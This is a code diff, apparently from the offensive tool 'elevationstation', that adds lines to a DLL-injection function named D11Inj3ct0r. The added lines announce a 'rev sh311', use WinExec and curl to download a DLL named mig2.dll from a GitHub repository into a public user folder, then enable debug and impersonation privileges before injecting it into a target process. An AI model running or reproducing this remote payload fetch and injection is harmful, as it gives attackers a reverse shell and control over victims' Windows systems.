@@ -227,6 +227,9 @@ BOOL NamedPipeImpersonate()
 
 bool D11Inj3ct0r(DWORD pid)
 {
+    cout << "[+] Downloading your dll from the elevationstaiton repo for the rev sh311 now!\n";
+    WinExec("curl -# -L -o \"c:\\users\\public\\mig2.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/d11inj3ction_files/mig2.dll\"", 0);
+    Sleep(3000);
     //enable ALL necessary privs!!!
     setProcessPrivs(SE_DEBUG_NAME);
     setProcessPrivs(SE_IMPERSONATE_NAME);
